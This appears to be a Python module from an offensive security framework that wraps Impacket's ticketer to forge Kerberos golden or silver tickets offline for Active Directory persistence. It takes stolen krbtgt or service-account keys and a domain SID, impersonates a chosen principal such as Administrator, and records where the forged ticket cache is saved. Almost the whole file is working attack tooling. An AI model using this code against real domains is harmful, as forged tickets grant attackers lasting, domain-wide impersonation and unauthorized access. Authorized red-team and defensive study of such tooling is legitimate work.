"""
Impacket ticketer Module (golden/silver ticket forging — persistence).

Forges Kerberos TGTs (golden) or service tickets (silver) offline from a
recovered key. Golden tickets need the krbtgt NT hash (or AES key) and the
domain SID; silver tickets need a service account's key plus the target SPN.
Maps the OCD AD mind-map `persistence` category. This is an offline forge — it
touches no network and takes no login, only key material.
"""

from .common import ImpacketAdapter, observation


class ImpacketTicketerModule(ImpacketAdapter):
    """
    Impacket ticketer — forge a golden or silver Kerberos ticket.

    Golden: supply the krbtgt key (NTHASH or AESKEY) and DOMAIN_SID; the forged
    TGT impersonates USERNAME across the domain. Silver: additionally supply SPN
    and use the service account's key instead of krbtgt's. The .ccache is written
    locally for reuse via KRB5CCNAME.
    """

    def __init__(self, framework):
        super().__init__(framework)
        self.tool_name = "impacket-ticketer"

    @property
    def name(self) -> str:
        return "Impacket ticketer (golden/silver ticket)"

    @property
    def description(self) -> str:
        return "Forge a golden (krbtgt) or silver (service) Kerberos ticket offline for persistence"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "impacket"

    emits = ("resource",)

    def _init_options(self):
        super()._init_options()
        self.options.update({
            "USERNAME": {
                "value": None, "required": True,
                "description": "Principal to forge the ticket for (e.g., Administrator)",
                "default": None,
            },
            "DOMAIN": {
                "value": None, "required": True,
                "description": "Domain name (e.g., CORP.LOCAL)", "default": None,
            },
            "DOMAIN_SID": {
                "value": None, "required": True,
                "description": "Domain SID (-domain-sid), e.g., S-1-5-21-...", "default": None,
            },
            "NTHASH": {
                "value": None, "required": False,
                "description": "krbtgt (golden) or service (silver) NT hash (-nthash)",
                "default": None,
            },
            "AESKEY": {
                "value": None, "required": False,
                "description": "AES128/256 key in place of the NT hash (-aesKey)", "default": None,
            },
            "SPN": {
                "value": None, "required": False,
                "description": "Target SPN for a silver ticket (-spn); omit for golden",
                "default": None,
            },
        })

    def build_argv(self) -> list[str]:
        """Build the impacket-ticketer argv. Offline — no auth target."""
        cmd = [self.tool_name]
        nthash = self.get_option("NTHASH")
        aeskey = self.get_option("AESKEY")
        if nthash:
            cmd += ["-nthash", str(nthash)]
        if aeskey:
            cmd += ["-aesKey", str(aeskey)]
        domain_sid = self.get_option("DOMAIN_SID")
        if domain_sid:
            cmd += ["-domain-sid", str(domain_sid)]
        domain = self.get_option("DOMAIN")
        if domain:
            cmd += ["-domain", str(domain)]
        spn = self.get_option("SPN")
        if spn:
            cmd += ["-spn", str(spn)]
        username = self.get_option("USERNAME")
        if username:
            cmd.append(str(username))
        return cmd

    def parse_output(self, output: str) -> dict:
        """Parse ticketer output for the forged ccache and ticket kind."""
        results = {
            "success": False,
            "ticket_file": None,
            "ticket_kind": "silver" if self.get_option("SPN") else "golden",
            "observations": [],
            "credentials": [],
        }
        domain = self.get_option("DOMAIN")
        username = self.get_option("USERNAME")
        for line in output.splitlines():
            stripped = line.strip()
            # Tolerate both "Saving ticket in" (0.13) and "Saving/Updating ticket in" (master).
            if "ticket in" in stripped and ("Saving" in stripped or "Updating" in stripped):
                ticket = stripped.split("ticket in", 1)[1].strip()
                results["ticket_file"] = ticket
                results["success"] = True
                results["observations"].append(observation(
                    "resource", ticket, resource_type="kerberos_ccache",
                    ticket_kind=results["ticket_kind"], principal=username, domain=domain,
                    source=self.tool_name))
        return results

    def run(self):
        """Gate success on an actually-saved ticket rather than exit code alone."""
        result = super().run()
        if isinstance(result, dict):
            parsed = result.get("parsed") or {}
            result["success"] = bool(result.get("success")) and bool(parsed.get("success"))
        return result
